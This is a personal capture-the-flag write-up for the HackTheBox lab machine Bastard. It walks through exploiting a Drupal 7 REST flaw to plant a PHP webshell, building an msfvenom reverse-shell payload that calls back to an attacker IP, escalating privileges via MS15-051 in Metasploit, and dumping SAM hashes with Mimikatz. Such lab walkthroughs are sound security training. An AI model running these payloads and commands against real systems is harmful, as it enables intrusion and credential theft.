---
layout: single
title:  "HTB - Bastard Writeup - 10.10.10.9"
date:   2020-07-22 08:49:23 +0100
categories: hackthebox
excerpt: My walkthrough of the HTB Windows Server machine Bastard.
---
![bastard](/images/bastard/htb.png)

# HackTheBox - Bastard - 10.10.10.9

Bastard is a medium rated Windows Server 2008 R2 machine on [hackthebox.eu](https://app.hackthebox.eu).

## Summary
Bastard is not overly challenging, however it requires some knowledge of PHP in order to modify and use the proof of concept required for initial entry. This machine demonstrates the potential severity of vulnerabilities in content management systems.

## Recon and Scanning
### Nmap Results
{% highlight bash linenos %}
Nmap 7.80 scan initiated Fri May  1 10:06:33 2020 as: nmap -sC -sV -oA nmap/bastard 10.10.10.9
Nmap scan report for 10.10.10.9
Host is up (0.052s latency).
Not shown: 997 filtered ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to 10.10.10.9 | 10.10.10.9
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

{% endhighlight %}

From the ports shown here I can see that this is a Windows Box running [IIS 7.5](https://docs.bmc.com/docs/display/Configipedia/Microsoft+Internet+Information+Services), meaning that we are dealing with a Windows Server 2008 R2 box.  

## Drupal Exploit

The fact that Drupal 7 is also listed bring to mind [this](https://www.exploit-db.com/exploits/41564) exploit for Drupal 7.x CMS applications, allowing unauthenticated remote code execution. For the script to work we need to know the rest endpoint and the ip of the server, to find the rest endpoint I will use [GoBuster]() with the dirbuster `directory-list-2.3-medium.txt` wordlist.

![exploit-parms](/images/bastard/exploit-1.png)

### Directory Busting to find the REST endpoint

{% highlight powershell %}
gobuster dir -u http://10.10.10.9 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
{% endhighlight %}

![rest](/images/bastard/rest.png)

Bingo, we now have the url of the rest endpoint, `/rest` now we can download the exploit script and fill in the necessary paramaters.

## Getting a Shell as iusr

Firstly we will need to download the php-curl library from apt, this can be done with:

{% highlight bash linenos %}
sudo apt install php-curl
{% endhighlight %}

Next, we need to modify the [script](https://www.exploit-db.com/exploits/41564) from Exploit DB to include the rest endpoint, the ip of Bastard, the name of the php webshell to be placed and the contents of that php file, below are the values that I used.

![script](/images/bastard/webshell.png)

Specifically I changed the contents of the webshell to be,
{% highlight php linenos %}
<?php echo system($_GET["cmd"]); ?>
{% endhighlight %}

This will give us a nicer shell.

### Running the Exploit

Now that we have modified our PHP script, we can run it with the following command:

{% highlight php linenos %}
php Drupal-Exploit.php
{% endhighlight %}

![webshell-1](/images/bastard/exploit-2.png)

Now if we visit the given URL and append `?cmd=whoami`, we can see that we have a shell as `nt authority\iusr`

![webshell-1](/images/bastard/webshell-1.png)

## Priv Esc to Administrator

### Generating a Meterpreter Payload
To start things of, I will generate a executable meterperter payload so that we can get a meterpreter session instead of this PHP webshell.

The command to generate a `.exe` payload is:

{% highlight bash linenos %}
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.23 LPORT=4567 -f exe > msf.exe
{% endhighlight %}

 - Replacing LHOST with your HTB IP
 - Replacing LPORT with a port of your choosing

![msf-1](/images/bastard/msf-1.png)

### Setting Up Metasploit

To get a Meterpreter session we first need to upload our `msf.exe` file to the server, for this I will use [Impacket's](https://github.com/SecureAuthCorp/impacket) `smbserver.py` to spin up a smb share in our current working directory, then we will use the Windows `copy` command to get the file onto the machine.

To start a SMB Server simply run:
{% highlight powershell linenos %}
smbserver.py evilshare /root/htb/boxes/Bastard/
{% endhighlight %}

![smb-server](/images/bastard/smb-1.png)

Now that the smb server is running we can enter `copy \\10.10.14.23\evilshare\msf.exe msf.exe` into our PHP webshell.

![smb-2](/images/bastard/smb-2.png)

We can then open Metasploit console and use `exploit/multi/handler` to recieve the callback from our payload

![msf-2](/images/bastard/msf-2.png)

Next, set the payload to the same as the one from msfvenom, `windows/x64/meterpreter/reverse_tcp`
 - Set LHOST to your HTB IP
 - Set LPORT to the one from MSFVenom
 - Now type `exploit` to start the listner

![msf-options](/images/bastard/msf-3.png)

### Popping a Meterpreter Shell

Now that the listner is running, we can go back to our webshell and simply enter the `msf.exe` command like this:

![msf-4](/images/bastard/msf-4.png)

Bingo! We got a Meterpreter Shell!

## IUser to SYSTEM
### Windows Exploit Suggester

As this is an older version of Windows Server, we will first load up the `post/multi/recon/local_exploit_suggester` to get a list of possible priv-escs 

{% highlight powershell linenos %}
use post/multi/recon/local_exploit_suggester
set SESSION <meterpreter session ID>
run
{% endhighlight %}

![msf-5](/images/bastard/msf-5.png)

Unluckily, the exploit we need is not here, [this is the exploit we need](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2015/ms15-051) I found this out by trial and error as the system is an unpatched version of Server 2008 R2 it will be vulnerable to this exploit. 

### MS15-051 Metasploit Module

Luckily for us, Metasploit has a module for MS15-051, `exploit/windows/local/ms15_051_client_copy_image`

![ms15](/images/bastard/ms15.png)

The parameters we need to set are:
 - LHOST, our HTB IP
 - LPORT, a local port of your choosing
 - SESSION, our Meterpreter sesison number
 - TARGET, 1 as we are attacking 64 bit Windows

![ms15-1](/images/bastard/ms15-1.png)

### A Meterpreter Session as SYSTEM

Now the options are set we can type `exploit` and wait for a reverse connection

![bingo](/images/bastard/msf-6.png)

Nice, we now have a shell as SYSTEM

## User and Root Flags

We can also now get the root and user flags.

{% highlight powershell linenos %}
type \users\dimitris\desktop\user.txt
type \users\administrator\desktop\root.txt.txt
{% endhighlight %}

![flags](/images/bastard/flags.png)

## Beyond Root

Now that we have rooted the machine we can load the [Mimikatz Meterpreter module](https://www.offensive-security.com/metasploit-unleashed/mimikatz/) and dump the SAM hashes.

{% highlight powershell linenos %}
load mimikatz
mimikatz_command -f samdump::hashes
{% endhighlight %}

![hashes](/images/bastard/hashes.png)

## Pwned

![pwned](/images/bastard/pwned.png)

## Respect
If you enjoyed the write up or found it useful consider + repping my htb profile linked below:

[![HTB](http://www.hackthebox.eu/badge/image/210952.png)](https://www.hackthebox.eu/home/users/profile/210952)

